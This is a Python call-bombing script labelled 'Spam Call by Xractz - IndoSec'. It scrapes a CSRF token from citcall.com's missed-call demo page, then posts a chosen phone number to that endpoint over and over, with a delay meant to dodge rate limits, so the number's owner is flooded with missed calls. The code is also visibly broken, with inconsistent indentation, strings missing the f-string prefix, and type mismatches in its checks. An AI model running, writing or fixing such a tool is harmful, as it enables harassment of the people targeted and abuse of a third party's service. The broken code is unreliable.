#Xractz
#IndoSec
#Dadmehr0-Garfox
import time, re, sys, os
from requests import Session

s = Session()

# colors
class color:
        Red = '\u001b[31m'
        Blue = '\u001b[34m'
        Reset =  '\u001b[0m'
        Green = '\u001b[32m'
        Yellow = '\u001b[33m'
# Fun
def clear():
    try:
    	os.system('clear')
    except:
	os.system('cls')

# Var
n = 0
plus = '+'
Cuntry_numbers = ['62','61','673','885','1','86','852','91','62','856','60','31','64','63','7','65','66','966','670','90','44','1','84']
phone_number_END = plus+''
vr_y = ['Y','y']
vr_n = ['N','n']

clear()
print(color.Blue+"Spam Call by Xractz - IndoSec\nThis tool delays 5 seconds per spam so as not to limit!\nUse Country Code (ex: +xxx912-312-923 WITHOUT (+))\n"+50*"="+"\n"+color.Reset+'')

try:
    cuntry_code = int(input('[+] Country Code  : '))
    no = int(input("[+] Number  : "))
    jml = int(input("[+] Count  : "))

    # Check Cuntry code & phone number & jml 
    if cuntry_code == '':
    	print(color.Red+'[!] Enter Your Cuntry Code !!'+color.Reset+'')
    else:
    if cuntry_code in Cuntry_numbers:
	phone_number_END += cuntry_code
    if no == '':
	print(color.Red+'[!] Enter Phone Number !!'+color.Reset+'')
    else:
	phone_num = str(no)
	phone_number_END += phone_num
    if jml == '':
	print(color.Red+'[!] Enter Reapet (Num)'+color.Reset+'')

    # Verify Phone number
    print(color.Yellow+'\n[*] Number  : {phone_number_END}\n'+color.Reset+'')
    while True:
	vrify = input('[*] Verify Phone Number(y/N) ')
	if vrify in vr_y:
	    clear()
	    break
	elif vrify in vr_n:
	    exit()
	else:
	    exit()
except ValueError:
    print(color.Red+'\t\n[!] Only Number '+color.Reset+'')

# API
url = "https://www.citcall.com/demo/misscallapi.php"
tkn = s.get(url).text

token = re.findall(r'id="csrf_token" value="(.*?)">', tkn)[0]
headers = {
        'x-requested-with':'XMLHttpRequest'}

data = {
    'cid':phone_number_END,
    'trying':'0',
    'csrf_token':token}
# Sned Process
try:
    while n < jml:
	send = s.post(url, data=data, headers=headers).text
	time.sleep(4.8)
	if 'Success' in send:
	    n +=1
            print(color.Green+"[*] Sended to => {phone_number_END}"+color.Reset+'')
	else:
	    print(color.Yellow+"\n[!] Limited ")
	    print(color.Yellow+"\n[!] Try one hour ago or try tomorrow"+color.Reset+'')
	    break
except:
    print(color.Red+"\n[!] Error"+color.Reset+'')
    sys.exit()
